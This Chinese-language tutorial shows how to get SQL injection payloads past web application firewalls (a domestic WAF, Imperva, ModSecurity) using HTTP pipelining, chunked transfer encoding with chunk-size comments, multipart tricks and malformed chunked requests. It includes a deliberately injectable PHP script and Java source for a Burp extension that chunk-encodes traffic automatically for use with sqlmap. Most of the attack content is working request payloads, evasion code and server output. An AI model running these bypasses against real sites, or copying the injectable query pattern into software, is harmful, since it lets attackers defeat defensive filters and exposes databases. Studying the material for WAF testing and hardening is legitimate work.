# 编写插件绕过WAF

## 一、在HTTP协议层面绕过WAF

### **原理**

给服务器发送payload数据包，使得waf无法识别出payload,当apache,tomcat等web容器能正常解析其内容。如图一所示

![在HTTP协议层面绕过WAF](https://image.3001.net/images/20190103/1546517507_5c2dfc03a7bd0.png!small)

### **实验环境** <a href="#h2-2" id="h2-2"></a>

本机win10+xampp+某狗web应用防火墙最新版。为方便演示，存在sql注入的脚本中使用$\_REQUEST\["id"]来接收get,或者post提交的数据。waf配置为拦截url和post的and  or 注入，如图二所示。<br>

![在HTTP协议层面绕过WAF](https://image.3001.net/images/20190105/1546679837_5c30761d308ee.png!small)

图二

发送get请求或利用hackbar插件发送post请求payload均被拦截，如图三。

图三

![在HTTP协议层面绕过WAF](https://image.3001.net/images/20190105/1546684328_5c3087a8b64c9.png!small)

### 一·  利用pipline绕过\[该方法经测试会被某狗拦截] <a href="#h2-3" id="h2-3"></a>

#### **原理**： <a href="#h3-1" id="h3-1"></a>

http协议是由tcp协议封装而来，当浏览器发起一个http请求时，浏览器先和服务器建立起连接tcp连接，然后发送http数据包（即我们用burpsuite截获的数据），其中包含了一个Connection字段，一般值为close，apache等容器根据这个字段决定是保持该tcp连接或是断开。当发送的内容太大，超过一个http包容量，需要分多次发送时，值会变成keep-alive，即本次发起的http请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止。

1\. 关闭burp的Repeater的Content-Length自动更新，如图四所示，点击红圈的Repeater在下拉选项中取消update Content-Length选中。**这一步至关重要！！！**

![在HTTP协议层面绕过WAF](https://image.3001.net/images/20190103/1546519272_5c2e02e82e654.png!small)

2\. burp截获post提交

```
id=1 and 1=1
```

&#x20;,显示被waf拦截如图五所示。

![在HTTP协议层面绕过WAF](https://image.3001.net/images/20190105/1546684814_5c30898e3ea2d.png!small)

3\. 复制图五中的数据包黏贴到

```
id=1 and 1=1
```

后面如图六所示。

图六

![在HTTP协议层面绕过WAF](https://image.3001.net/images/20190105/1546685172_5c308af40092c.png!small)

4\. 接着修改第一个数据包的数据部分，即将

```
id=1+and+1%3D1
```

修改为正常内容id=1，再将数据包的Content-Length的值设置为修改后的【id=1】的字符长度即4，最后将Connection字段值设为keep-alive。提交后如图七所示，会返回两个响应包，分别对应两个请求。

![在HTTP协议层面绕过WAF](https://image.3001.net/images/20190105/1546694601_5c30afc948163.png!small)

图七

**注意：**&#x4ECE;结果看，第一个正常数据包返回了正确内容，第二个包含有效载荷的数据包被某狗waf拦截，说明两数据包都能到达服务器，在面对其他waf时有可能可以绕过。无论如何这仍是一种可学习了解的绕过方法，且可以和接下来的方法进行组合使用绕过。

### 二.利用分块编码传输绕过\[该方法可绕某狗] <a href="#h2-4" id="h2-4"></a>

#### **原理：** <a href="#h3-2" id="h3-2"></a>

在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，post请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。

1\. 开启上个实验中已关闭的content-length自动更新。给post请求包加入Transfer-Encoding: chunked后，将数据部分id=1 and 1=1进行分块编码（注意长度值必须为十六进制数），每一块里长度值独占一行，数据占一行如图八所示。

图八

![在HTTP协议层面绕过WAF](https://image.3001.net/images/20190105/1546696724_5c30b814eb553.png!small)

2.将上面图八数据包的

```
id=1 and 1=1
```

改为

```
id=1 and 1=2
```

&#x20; 即将图八中所标的第4块的1改为2。如图九所示没有返回数据，payload生效。

![在HTTP协议层面绕过WAF](https://image.3001.net/images/20190105/1546697069_5c30b96db44d7.png!small)

图九

注意：分块编码传输需要将关键字and,or,select ,union等关键字拆开编码，不然仍然会被waf拦截。编码过程中长度需包括空格的长度。最后用0表示编码结束，并在0后空两行表示数据包结束，不然点击提交按钮后会看到一直处于waiting状态。

### 三.利用协议未覆盖进行绕过\[同样会被某狗拦截] <a href="#h2-5" id="h2-5"></a>

#### **原理：** <a href="#h3-3" id="h3-3"></a>

HTTP头里的Content-Type一般有application/x-www-form-urlencoded，multipart/form-data，text/plain三种，其中multipart/form-data表示数据被编码为一条消息，页上的每个控件对应消息中的一个部分。所以，当waf没有规则匹配该协议传输的数据时可被绕过。

1.将头部Content-Type改为multipart/form-data; boundary=69   然后设置分割符内的Content-Disposition的name为要传参数的名称。数据部分则放在分割结束符上一行。

图十

![在HTTP协议层面绕过WAF](https://image.3001.net/images/20190105/1546701023_5c30c8df53897.png!small)

由于是正常数据提交，所以从图十可知数据是能被apache容器正确解析的，尝试1 and 1=1也会被某狗waf拦截，但如果其他waf没有规则拦截这种方式提交的数据包，那么同样能绕过。<br>

2.一般绕waf往往需要多种方式结合使用，如图十的示例中，只需将数据部分1 and 1=1用一个小数点"."当作连接符即1.and 1=1就可以起到绕过作用。当然，这只是用小数点当连接符所起的作用而已。如图十一所示。

图十一

![在HTTP协议层面绕过WAF](https://image.3001.net/images/20190106/1546706168_5c30dcf8e6717.png!small)

### 四.分块编码+协议未覆盖组合绕过 <a href="#h2-6" id="h2-6"></a>

1.在协议未覆盖的数据包中加入Transfer-Encoding: chunked ，然后将数据部分全部进行分块编码，如图十二所示(数据部分为1 and 1=1)。

图十二

![在HTTP协议层面绕过WAF](https://image.3001.net/images/20190106/1546710626_5c30ee620b7e9.png!small)

**注意：**&#x7B2C;2块，第3块，第7块，和第8块。

**第2块**中需要满足

```
长度值
空行
Content-Disposition: name="id"
空行
```

这种形式，且长度值要将两个空行的长度计算在内（空行长度为2）。

**第3块**，即数据开始部分需满足

```
长度值 
空行
数据
```

形式，且需将空行计算在内。

**第7块**即分割边界结束部分，需满足

```
长度值
空行
分割结束符
空行
```

形式，且计算空行长度在内。

**第8块**需满足

```
0  
空行
空行
```

形式。如果不同时满足这四块的形式要求，payload将不会生效。

## 二、利用分块传输吊打所有WAF

### 技巧1 使用注释扰乱分块数据包

一些如Imperva、360等比较好的WAF已经对Transfer-Encoding的分块传输做了处理，可以把分块组合成完整的HTTP数据包，这时直接使用常规的分块传输方法尝试绕过的话，会被WAF直接识别并阻断。

我们可以在[\[RFC7230\]](https://tools.ietf.org/html/rfc7230)中查看到有关分块传输的定义规范。

```java
4.1.  Chunked Transfer Coding

   The chunked transfer coding wraps the payload body in order to
   transfer it as a series of chunks, each with its own size indicator,
   followed by an OPTIONAL trailer containing header fields.  Chunked
   enables content streams of unknown size to be transferred as a
   sequence of length-delimited buffers, which enables the sender to
   retain connection persistence and the recipient to know when it has
   received the entire message.

     chunked-body   = *chunk
                      last-chunk
                      trailer-part
                      CRLF

     chunk          = chunk-size [ chunk-ext ] CRLF
                      chunk-data CRLF
     chunk-size     = 1*HEXDIG
     last-chunk     = 1*("0") [ chunk-ext ] CRLF

     chunk-data     = 1*OCTET ; a sequence of chunk-size octets

   The chunk-size field is a string of hex digits indicating the size of
   the chunk-data in octets.  The chunked transfer coding is complete
   when a chunk with a chunk-size of zero is received, possibly followed
   by a trailer, and finally terminated by an empty line.

   A recipient MUST be able to parse and decode the chunked transfer
   coding.

4.1.1.  Chunk Extensions

   The chunked encoding allows each chunk to include zero or more chunk
   extensions, immediately following the chunk-size, for the sake of
   supplying per-chunk metadata (such as a signature or hash),
   mid-message control information, or randomization of message body
   size.

     chunk-ext      = *( ";" chunk-ext-name [ "=" chunk-ext-val ] )

     chunk-ext-name = token
     chunk-ext-val  = token / quoted-string

   The chunked encoding is specific to each connection and is likely to
   be removed or recoded by each recipient (including intermediaries)
   before any higher-level application would have a chance to inspect
   the extensions.  Hence, use of chunk extensions is generally limited
```

通过阅读规范发现分块传输可以在长度标识处加上分号“;”作为注释，如：

```
9;kkkkk
1234567=1
4;ooo=222
2345
0
(两个换行)
```

几乎所有可以识别Transfer-Encoding数据包的WAF，都没有处理分块数据包中长度标识处的注释，导致在分块数据包中加入注释的话，WAF就识别不出这个数据包了。

现在我们在使用了Imperva应用防火墙的网站测试常规的分块传输数据包：

```
POST /xxxxxx.jsp HTTP/1.1
......
Transfer-Encoding: Chunked

9
xxxxxxxxx
9
xx=xxxxxx
9
xxxxxxxxx
1
d
9
&a=1	and	
3
2=2
0
（两个换行）
```

返回的结果如下图所示。

![](https://p0.ssl.qhimg.com/dm/1024_509_/t01e68aae3729de0934.png)

可以看到我们的攻击payload “and 2=2”被Imperva的WAF拦截了。

这时我们将分块传输数据包加入注释符。

```
POST /xxxxxx.jsp HTTP/1.1
......
Transfer-Encoding: Chunked

9
xxxxxxxxx
9
xx=xxxxxx
9
xxxxxxxxx
1;testsdasdsad
d
9;test
&a=1	and	
3;test44444
2=2
0
(两个换行)
```

返回的结果如下图所示。

![](https://p1.ssl.qhimg.com/dm/1024_512_/t016a21d39c2ed6911a.png)

可以看到Imperva已经不拦截这个payload了。

### 技巧2 Bypass ModSecurity <a href="#h2-1" id="h2-1"></a>

众所周知ModSecurity是加载在中间件上的插件，所以不需要理会解析http数据包的问题，因为中间件已经帮它处理完了，那么无论使用常规的分块还是加了注释的分块数据包，ModSecurity都能直接获取到完整的http数据包然后匹配危险关键字，所以一些基于ModSecurity做的WAF产品难道就不受影响吗？

接下来我们在Apache+ModSecurity环境做测试。

sql.php 代码如下：

```php
<?php
ini_set("display_errors", "On");
error_reporting(E_ALL);
$con = mysql_connect("localhost","root","");
if (!$con)
{
    die('Could not connect: ' . mysql_error());
}
mysql_select_db("test", $con);
$id = $_REQUEST["id"];
$sql = "select * from user where id=$id";
$result = mysql_query($sql,$con);
while($row = mysql_fetch_array($result))
{
    echo $row['name'] . " " . $row['password']."n";
}
mysql_close($con);
print "========GET==========n";
print_r($_GET);
print "========POST==========n";
print_r($_POST);
?>
<a href="sqli.php?id=1"> sdfsdf </a>
```

ModSecurity加载的规则拦截了请求包中的关键字“union”。

下面我们的请求和返回结果如下：

```
请求:
http://10.10.10.10/sql.php?id=2%20union

返回:
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /sql.php was not found on this server.</p>
<hr>
<address>Apache/2.2.15 (CentOS) Server at 10.10.10.10 Port 80</address>
</body></html>
```

可以看到我们的“union”关键字被拦截了。

接下来我们传输一个畸形的分块数据包看看。

```markup
请求:
POST /sql.php?id=2%20union HTTP/1.1
......
Transfer-Encoding: chunked

1
aa
0
(两个换行)


返回:
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.2.15 (CentOS) Server at 10.10.10.10 Port 80</address>
</body></html>
========GET==========
Array
(
   [id] => 2 union
)
========POST==========
Array
(
)
```

可以看到虽然apache报错了，但是因为apache容错很强，所以我们提交的参数依然传到了php，而我们的ModSecurity并没有处理400错误的数据包，最终绕过了ModSecurity。

接下来我们把ModSecurity的规则改为过滤返回数据中包含“root”的字符串，然后在sql.php脚本中加入打印“root”关键字的代码。

接着我们做如下测试：

```markup
请求：
http://10.10.10.10/sql.php?id=1

返回:
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /sql.php
on this server.</p>
<hr>
<address>Apache/2.2.15 (CentOS) Server at 10.10.10.10 Port 80</address>
</body></html>
```

因为 sql.php 脚本中返回了带有“root”的关键字，所以直接就被 ModSecurity 拦截了。这时我们改为发送畸形的分块数据包。

```
请求:
POST /sql.php?id=1 HTTP/1.1
Host: 10.10.10.10
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 16

3
123
1
0
(两个换行)


返回:
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.2.15 (CentOS) Server at 10.10.10.10 Port 80</address>
</body></html>
root 123456
========GET==========
Array
(
   [id] => 1
)
========POST==========
Array
(
)
```

通过两个测试可以发现使用畸形的分块数据包可以直接绕过ModSecurity的检测。这个问题我们在2017年4月已提交给ModSecurity官方，但是因为种种问题目前依然未修复。

## 三、编写Burp分块传输插件绕WAF

### 0x01 功能设计 <a href="#id-0x01-gong-neng-she-ji" id="id-0x01-gong-neng-she-ji"></a>

我们先来看看插件要实现的功能

1. 在Burp Repeater套件上可对数据包进行快速chunked解码编码
2. 自动化对Burp的Proxy，scanner，spider等套件的数据包进行编码
3. 可设置分块长度，是否开启注释

### 0x02 编写代码 <a href="#id-0x02-bian-xie-dai-ma" id="id-0x02-bian-xie-dai-ma"></a>

限于边幅，我只说明核心函数，并通过注释的方式解释代码的相关功能。

**2.1 编码函数**

这是我们的核心函数，对各个套件数据HTTP数据进行`chunked`编码

```java
public static  byte[] encoding(IExtensionHelpers helpers, IHttpRequestResponse requestResponse, int split_len, boolean isComment) throws UnsupportedEncodingException {
	byte[] request = requestResponse.getRequest();
	IRequestInfo requestInfo = helpers.analyzeRequest(request);
	int bodyOffset = requestInfo.getBodyOffset();
	int body_length = request.length - bodyOffset;
	String body = new String(request, bodyOffset, body_length, "UTF-8");
	// 对长度大于10000的数据包，不处理
	if (request.length - bodyOffset > 10000){
		return request;
	}

	//对数据包进行编码处理
	List<String> str_list = Util.getStrList(body,Config.splite_len);
	String encoding_body = "";
	for(String str:str_list){
		if(Config.isComment){
			encoding_body += String.format("%s;%s",Util.decimalToHex(str.length()),Util.getRandomString(10));
		}else{
			encoding_body += Util.decimalToHex(str.length());
		}
		encoding_body += "\r\n";
		encoding_body += str;
		encoding_body += "\r\n";
	}
	encoding_body += "0\r\n\r\n";

	//在数据包中添加Transfer-Encoding: chunked头
	List<String> headers = helpers.analyzeRequest(request).getHeaders();
	Iterator<String> iter = headers.iterator();
	while (iter.hasNext()) {
		if (((String)iter.next()).contains("Transfer-Encoding")) {
			iter.remove();
		}
	}
	headers.add("Transfer-Encoding: chunked");
	return helpers.buildHttpMessage(headers,encoding_body.getBytes());
}
```

自动编码其他模块的数据包，我们可以通过实现Burp的`IHttpListener`，`IProxyListener`这两个接口，分别实现`processHttpMessage()`，`processProxyMessage()`这两个方法。

这里注意一个问题，Burp的所有模块的HTTP流量都会经过`IHttpListener.processHttpMessage()`这个方法，但是如果在这里处理数据包的话，Burp Proxy模块的数据包被修改之后,不会在Proxy套件UI界面显示修改后的流量，故Proxy模块流量处理单独使用`IProxyListener.processProxyMessage()`。

**2.2 自动编码Proxy套件的流量**

```java
@Override
public void processProxyMessage(final boolean messageIsRequest, final IInterceptedProxyMessage proxyMessage) {
	if(messageIsRequest && isValidTool(IBurpExtenderCallbacks.TOOL_PROXY)){
		IHttpRequestResponse messageInfo = proxyMessage.getMessageInfo();
		IRequestInfo reqInfo = helpers.analyzeRequest(messageInfo.getRequest());
		//只对Content-Typt头为application/x-www-form-urlencode的POST包进行编码
		if(reqInfo.getMethod().equals("POST") && reqInfo.getContentType() == IRequestInfo.CONTENT_TYPE_URL_ENCODED){
			try {
				//使用encoding方法对原请求包进行chunked编码
				byte[] request = Transfer.encoding(helpers, messageInfo, Config.splite_len,Config.isComment);
				if (request != null) {
					//将原HTTP请求包替换为chunked编码后的请求包
					messageInfo.setRequest(request);
				}
			} catch (Exception e) {
				stderr.println(e.getMessage());
			}
		}
	}
}
```

**2.3 自动编码Proxy之外的套件（Intruder，scanner…）流量**

```java
@Override
public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
	//Proxy套件流量不处理，否则会出现两次编码问题，其余套件均在这里处理。
	if(messageIsRequest && isValidTool(toolFlag) && (toolFlag != IBurpExtenderCallbacks.TOOL_PROXY)){
		IRequestInfo reqInfo = helpers.analyzeRequest(messageInfo.getRequest());

		if(reqInfo.getMethod().equals("POST") && reqInfo.getContentType() == IRequestInfo.CONTENT_TYPE_URL_ENCODED){
			try {
				byte[] request = Transfer.encoding(helpers, messageInfo, Config.splite_len,Config.isComment);
				if (request != null) {
					messageInfo.setRequest(request);
				}
			} catch (Exception e) {
				stderr.println(e.getMessage());
			}
		}
	}
}
```

完整的代码，已经上传github，地址如下：

[http://github.com/c0ny1/chunked-coding-converter](https://github.com/c0ny1/chunked-coding-converter)

### 0x03 效果演示 <a href="#id-0x03-xiao-guo-yan-shi" id="id-0x03-xiao-guo-yan-shi"></a>

#### **3.1 演示一：快速编码解码**

在Burp repeater套件可以快速对请求内容进行chunked编码解码，来对WAF进行测试。

[<br>](https://gv7.me/articles/2019/chunked-coding-converter/repeater-chunked-coding.gif)快速编码解码对WAF进行测试

![快速编码解码对WAF进行测试](https://gv7.me/articles/2019/chunked-coding-converter/repeater-chunked-coding.gif)

**3.2 演示二：搭配sqlmap进行sql注入**

sqlmap代理到Burp中，插件对Proxy套件的流量进行编码处理，来绕过waf。

搭配sqlmap绕waf

![搭配sqlmap绕waf](https://gv7.me/articles/2019/chunked-coding-converter/sqlmap-bypassWAF.gif)
